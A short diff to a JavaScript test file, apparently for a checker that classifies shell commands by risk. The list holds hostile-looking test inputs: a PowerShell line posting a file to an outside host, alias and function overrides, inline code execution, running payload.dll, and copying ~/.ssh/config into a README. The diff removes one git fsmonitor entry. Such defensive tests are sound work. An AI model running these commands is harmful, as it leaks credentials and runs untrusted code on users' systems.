@@ -52,7 +52,7 @@ describe("ordinary data and executable roles", () => {
     "Set-Content out.txt $x; iwr https://x.invalid -InFile out.txt -Method Post",
     "Set-Content $destination $x", "Set-Content Alias:iwr $x", "Set-Content Function:iwr $x",
     "Set-Content Variable:p $x; iwr @p",
-    "git -c core.fsmonitor=helper status", "node -e $code", "node --test --eval $code",
+    "node -e $code", "node --test --eval $code",
     "python -c $code", "python -m http.server", "dotnet exec payload.dll",
     String.raw`Copy-Item C:\tools\python3.exe x.txt; Unknown-Runner x.txt`,
     "Set-Content README.md @\"\n$(Get-Content $HOME/.ssh/config)\n\"@",
